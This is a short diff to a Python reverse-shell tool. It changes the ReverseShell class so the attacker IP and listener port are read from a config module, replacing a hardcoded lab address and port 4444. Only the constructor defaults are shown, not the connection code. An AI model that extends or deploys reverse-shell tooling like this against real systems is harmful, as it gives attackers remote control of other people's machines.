@@ -10,8 +10,12 @@ import sys
 import time
 import platform
 
+# Load config from project root
+sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))
+from config import ATTACKER_IP, LISTENER_PORT
+
 class ReverseShell:
-    def __init__(self, server_ip='192.168.56.1', server_port=4444):
+    def __init__(self, server_ip=ATTACKER_IP, server_port=LISTENER_PORT):
         self.server_ip = server_ip
         self.server_port = server_port
         self.connected = False
